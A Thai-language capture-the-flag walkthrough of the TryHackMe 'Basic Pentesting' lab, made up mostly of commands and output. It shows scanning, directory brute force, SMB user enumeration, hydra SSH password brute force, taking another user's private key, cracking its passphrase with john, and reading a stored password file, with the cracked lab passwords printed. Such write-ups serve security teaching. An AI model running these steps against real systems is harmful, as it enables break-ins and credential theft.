source : [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)<br>
Title : Web app test <br>
IP : 10.10.111.12 <br>
## Step 1 use Nmap
```shell
┌──(root㉿kali)-[~]
└─# nmap -sV -sC 10.10.111.12
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-12 23:27 +07
Nmap scan report for 10.10.111.12
Host is up (0.30s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat (language: en)
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-03-12T12:29:44-04:00
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-03-12T16:29:43
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.39 seconds

```
สรุปคร่าวคือ มี port ที่เปิดอยู่ คือ `22 , 80 , 139 , 445 , 8009 , 8080` โดยเมื่อเรสไปที่ `http://10.10.111.12` เราก็จะพบกับหน้าว่างเปล่า ดังนั้น เราจะลองค้นหา path ที่ซ่อนอยู่กัน
## Step 2 Brute force path with gobuster
เราจะใช้ gobuster เพื่อค้นหา path ที่ซ่อนอยู่และจะใช้ wordlists ของ seclists ไปที่ `seclists/Discovery/Web-Content/common.txt` 
```shell
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.10.111.12 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.111.12
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/development          (Status: 301) [Size: 318] [--> http://10.10.111.12/development/]
Progress: 2072 / 4745 (43.67%)
[!] Keyboard interrupt detected, terminating.
Progress: 2079 / 4745 (43.81%)
===============================================================
Finished
===============================================================

```
เมื่อเข้าไปที่ `/development` ก็จะเจอไฟล์ที่น่าสนใจคือ `dev.txt` ซึ่งข้างในไฟล์เขียนไว้ดังนี้
```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. 

2018-04-21: I got Apache set up. Will put in our content later. -J
```
จะเห็นได้ว่า ผู้เขียนได้พูดถึง SMB(Server Message Block) เราก็จะไปค้นหาข้อมูลเกี่ยวกับสิ่งที่เขาพูดถึง
## Step 3 enumerating information with enum4linux
เราจะใช้เครื่องมือตัวนี้เพื่อค้นหาข้อมูลต่างๆของ smb ในเป้าหมายนี้
```shell
$ enum4linux -a 10.10.111.12
 =========================================( Target Information )=========================================

Target ........... 10.10.50.231
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.50.231 )============================

[S N I P . . .]


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)

[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''

S-1-5-21-2853212168-2008227510-3551253869-501 BASIC2\nobody (Local User)
S-1-5-21-2853212168-2008227510-3551253869-513 BASIC2\None (Domain Group)

```
เราจะได้ชื่อมาทั้งหมด 2 คนได้แก่ `kay and jan` จากนี้ เราจะทำการค้นหารหัสผ่าน ssh ของ jan เพื่อเข้าถึง server
## Step 4 Brute force ssh with hydra
เราจะใช้ hydra มาทำการค้นหารหัสผ่านโดยใช้ wordlists -> rockyou.txt
```shell
┌──(root㉿kali)-[~]
└─# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.111.12
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[22][ssh] host: 10.10.111.12   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```
เราก็จะได้ `password:armando` ต่อไปเราจะล็อกอินเข้าไปใน server 
```shell
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ssh jan@10.10.111.12
jan@basic2:~$ cd ..
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ 
jan@basic2:/home$ cd kay
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh
jan@basic2:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
เราก็จะพบกับ id_rsa private key ของ kay ดังนั้น เราจะนำตรงส่วนนนี้มาเป็นกุญแจให้เราเข้าสู่ระบบ kay
## Step 5 Login with id_rsa private key
```shell
┌──(root㉿root)-[~]
└─$ ssh kay@10.10.111.12 -i id_rsa
Enter passphrase for key 'id_rsa': 
```
จาดตรงนี้เราจะเห็นได้ว่า เราไม่มี passphrase ของ id_rsa ดังนั้น เราจึงต้องค้นหาก่อนจึงจะสามารถล็อกอินเข้าไปได้ โดยเราจะใช้ `john2rsa.py` มาใช้ในการค้นหาครั้งนี้
```shell
┌──(root㉿kali)-[/home/kali/Documents/shell]
└─# python3 john2rsa.py ../../Downloads/id_rsa > crack.txt 
```
จากนั้น เราก็จะใช้ john ในการถอด passphrase ออกมา
```shell
┌──(root㉿kali)-[/home/kali/Documents/shell]
└─# john crack.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
beeswax          (~/id_rsa)     
```
เราก็จะได้ passphrase ออกมาแล้ว แล้วเราจึงนำส่วนนี้ไปใช้ในการ login
```shell
┌──(root㉿root)-[~]
└─$ ssh kay@10.10.111.12 -i id_rsa
Enter passphrase for key 'id_rsa': beeswax

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.
         
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$

```
